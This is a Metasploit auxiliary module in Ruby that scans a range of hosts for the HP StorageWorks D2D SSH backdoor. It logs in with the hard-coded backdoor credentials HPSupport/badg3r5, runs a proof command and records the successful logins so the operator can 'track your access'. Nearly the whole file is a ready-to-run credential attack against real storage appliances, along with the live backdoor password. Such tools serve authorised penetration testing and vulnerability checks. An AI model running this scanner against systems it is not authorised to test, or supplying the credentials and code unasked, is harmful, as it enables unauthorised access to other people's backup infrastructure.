##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Report

	attr_accessor :ssh_socket, :good_credentials

	def initialize
		super(
			'Name'        => 'HP StorageWorks D2D Backdoor Scanner',
			'Description' => %q{
				This module will test SSH logins on a range of machines for the
				HP D2D Backdoor and report successful logins.  If you have 
				loaded a database plugin and connected to a database this 
				module will record successful logins and hosts so you can 
				track your access.
			},
			'Author'      => ['Luis "connection" Santana (based on ssh_login module by todb'],
			'References'     =>
				[
					[ 'URL', 'http://www.lolware.net/hpstorage.html']
				],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(22),
				OptString.new('USERNAME', [true, 'Username To Use. Don\'t Change','HPSupport']),
				OptString.new('PASS', [true, 'Password To Use. Don\'t Change','badg3r5'])
			], self.class
		)

		register_advanced_options(
			[
				OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
				OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
			]
		)

		deregister_options('RHOST')
		deregister_options('PASS_FILE')
		deregister_options('BLANK_PASSWORDS')
		deregister_options('USER_FILE')
		deregister_options('USER_AS_PASS')
		deregister_options('USERPASS_FILE')
		@good_credentials = {}

	end

	def rport
		datastore['RPORT']
	end

	def do_login(ip,user,pass,port)
		opt_hash = {
			:auth_methods  => ['password','keyboard-interactive'],
			:msframework   => framework,
			:msfmodule     => self,
			:port          => port,
			:disable_agent => true,
			:password      => pass,
			:config        => false,
			:proxies       => datastore['Proxies']
		}

		opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']

		begin
			::Timeout.timeout(datastore['SSH_TIMEOUT']) do
				self.ssh_socket = Net::SSH.start(
					ip,
					user,
					opt_hash
				)
			end
		rescue Rex::ConnectionError, Rex::AddressInUse
			return :connection_error
		rescue Net::SSH::Disconnect, ::EOFError
			return :connection_disconnect
		rescue ::Timeout::Error
			return :connection_disconnect
		rescue Net::SSH::Exception
			return [:fail,nil] # For whatever reason. Can't tell if passwords are on/off without timing responses.
		end

		if self.ssh_socket
			proof = ''
			begin
				Timeout.timeout(5) do
					proof = self.ssh_socket.exec!("show network config\n").to_s
					if(proof =~ /Valid/)
					end
				end
			rescue ::Exception
			end

			return [:success, proof]
		else
			return [:fail, nil]
		end
	end

	def do_report(ip,user,pass,port,proof)
		report_auth_info(
			:host => ip,
			:port => rport,
			:sname => 'ssh',
			:user => user,
			:pass => pass,
			:proof => proof,
			:source_type => "user_supplied",
			:active => true
		)
	end

	def run_host(ip)
		print_brute :ip => ip, :msg => "Scanning For Backdoor"
		each_user_pass do |user, pass|
			print_brute :level => :vstatus,
				:ip => ip,
				:msg => "Trying: username: 'HPSupport' with password: 'badg3r5'"
			this_attempt ||= 0
			ret = nil
			while this_attempt <=3 and (ret.nil? or ret == :connection_error or ret == :connection_disconnect)
				if this_attempt > 0
					select(nil,nil,nil,2**this_attempt)
					print_brute :level => :verror, :ip => ip, :msg => "Retrying due to connection error"
				end
				ret,proof = do_login(ip,'HPSupport','badg3r5',rport)
				this_attempt += 1
			end
			case ret
			when :success
				print_brute :level => :good, :ip => ip, :msg => "Success: We've Got A Backdoor!"
				do_report(ip,user,pass,rport,proof)
				:next_user
			when :connection_error
				print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
				:abort
			when :connection_disconnect
				print_brute :level => :verror, :ip => ip, :msg => "Connection timed out"
				:abort
			when :fail
				print_brute :level => :verror, :ip => ip, :msg => "Failed: No Backdoor Account"
			end
		end
	end

end
